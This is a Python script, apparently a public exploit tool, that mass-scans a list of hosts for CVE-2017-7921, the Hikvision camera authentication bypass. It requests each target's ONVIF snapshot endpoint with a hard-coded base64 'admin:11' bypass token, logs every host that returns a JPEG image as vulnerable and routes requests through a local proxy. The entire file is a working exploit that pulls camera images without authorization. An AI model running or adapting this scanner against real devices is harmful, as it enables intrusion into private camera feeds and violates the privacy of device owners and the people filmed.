# -*â€” coding=utf-8 -*-
# Author: A1andNS
# Time: 2021/12/06
# For CVE-2017-7921


import requests
import sys
import os


def check_argv(args):
    argv_len = len(args)
    if argv_len <= 1:
        return 0
    elif argv_len == 2:
        return 1
    elif argv_len == 3:
        return 2


def banner():
    print("  _   _ _  __                                   ____   \n"
          "| | | | |/ /___ __ _ _ __ ___   __ _ _ __ __ _/ ___|  ___ __ _ _ __\n"
          "| |_| | ' // __/ _` | '_ ` _ \ / _` | '__/ _` \___ \ / __/ _` | '_ \ \n"
          "|  _  | . \ (_| (_| | | | | | | (_| | | | (_| |___) | (_| (_| | | | |\n"
          "|_| |_|_|\_\___\__,_|_| |_| |_|\__,_|_|  \__,_|____/ \___\__,_|_| |_|\n"
          "                                                                         Code by A1andNS")


class FileLoader:
    filename = ''
    list = []

    def __init__(self, filename):
        print("[!]start to read the target list")
        self.filename = filename
        if not os.path.exists(self.filename):
            print("[X]list file not found!!!")
        else:
            self.read_data()

    def read_data(self):
        file1 = open(self.filename)
        for line in file1.readlines():
            line = line.strip()
            line = line.replace("https", "http")
            self.list.append(line)
        print("[+]list loading finished!!!")
        print("[+]ListContent: ", self.list)


class BugScanner:
    list = []
    save_name = ''

    def __init__(self, load_list, load_name):
        self.list = load_list
        self.save_name = load_name
        self.scan_bug()

    def scan_bug(self):
        result = open(self.save_name, "w")
        proxies = {
            "http": "http://127.0.0.1:7890",
            "https": "http://127.0.0.1:7890"
        }
        for ip in self.list:
            url = ip + "onvif-http/snapshot?auth=YWRtaW46MTEK"
            # print(url)
            try:
                res = requests.get(url, proxies=proxies, timeout=60)
                if res.status_code == 200:
                    if res.headers['Content-Type'] == "image/jpeg":
                        # print(res.content)
                        print("[+]" + url + " is a bug link")
                        result.write(url + "\n")
                    else:
                        print("[X]" + url + " not find bug")
                else:
                    print("[X]" + url + " not find bug")
            except:
                print("[X]" + url + " need to test manual")
        result.close()


if __name__ == "__main__":
    banner()
    default_save_path = "result.txt"
    if check_argv(sys.argv):
        filepath = sys.argv[1]
        fileLoader = FileLoader(filepath)
        if check_argv(sys.argv) == 2:
            save_path = sys.argv[2]
            bugSanner = BugScanner(fileLoader.list, save_path)
        else:
            bugSanner = BugScanner(fileLoader.list, default_save_path)
    else:
        print("[!]usage: python camara_bug_test.py list_filename //(use the default path)\n"
              "          python camara_bug_test.py list_filename save_filename //(use the given path)")
